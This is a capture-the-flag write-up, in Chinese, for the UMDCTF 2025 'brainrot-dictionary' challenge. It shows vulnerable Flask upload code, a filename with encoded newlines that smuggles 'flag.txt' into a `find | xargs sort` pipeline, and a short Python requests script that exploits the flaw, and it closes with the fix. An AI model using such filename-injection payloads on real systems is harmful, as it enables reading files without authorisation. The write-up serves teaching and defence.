# UMDCTF 2025 - brainrot-dictionary

## 题目简述

网站接受文件名以 `.brainrot` 结尾的上传，并把当前会话的所有词典文件交给：

```sh
find <upload_dir> -name \*.brainrot | xargs sort | uniq
```

上传目录中同时复制了 `flag.txt`。应用虽然拒绝解码后文件名中的 `/`，却允许换行；
`find` 默认以换行分隔输出，而 `xargs` 又按空白重新切分参数。因此可以让一个合法的
单一文件名在管道中被误解释成多个路径，其中一个路径就是 `flag.txt`。

## 解题过程

上传检查和保存顺序为：

```python
if not user_file.filename.endswith(".brainrot"):
    reject()

fname = unquote(user_file.filename)
if "/" in fname:
    reject()

user_file.save(os.path.join(session["upload_dir"], fname))
```

扩展名在 URL 解码前检查，而 `secure_filename` 虽被导入却没有使用。构造 multipart
文件名：

```text
x%0Aflag.txt%0Ay.brainrot
```

原始字符串以 `.brainrot` 结尾；`unquote` 后则成为一个包含两个换行的合法 POSIX
文件名：

```text
x
flag.txt
y.brainrot
```

注意这仍是一个文件名，不是三个文件。`find` 输出它时不会转义内部换行，所以送入
`xargs` 的文本近似为：

```text
uploads/<随机目录>/x
flag.txt
y.brainrot
```

`xargs sort` 将其拆成三个独立参数。首尾路径可能不存在并产生错误，但中间的
`flag.txt` 会相对 Flask 工作目录 `/usr/src/app` 打开；其内容进入 `sort` 的标准
输出，再被模板显示。

使用同一个 HTTP session 上传并跟随到 `/dict`：

```python
import requests

s = requests.Session()
r = s.post(
    "https://brainrot-dictionary.challs.umdctf.io/",
    files={
        "user_file": (
            "x%0Aflag.txt%0Ay.brainrot",
            b"brainrot",
            "application/octet-stream",
        )
    },
)

print(r.text)
```

返回词典列表中包含：

```text
UMDCTF{POSIX_no_longer_recommends_that_this_is_possible}
```

## 方法总结

本题是文件名边界与 shell 文本管道边界不一致导致的参数注入。POSIX 文件名只禁止
NUL 和 `/`，换行、空格等都可以存在；因此 `find | xargs` 不能安全传递任意文件名。
应使用 `find -print0 | xargs -0`，或在应用代码中直接枚举并打开文件。同时应先完成
规范化/解码，再验证扩展名和控制字符，不能只靠未实际调用的 `secure_filename`。
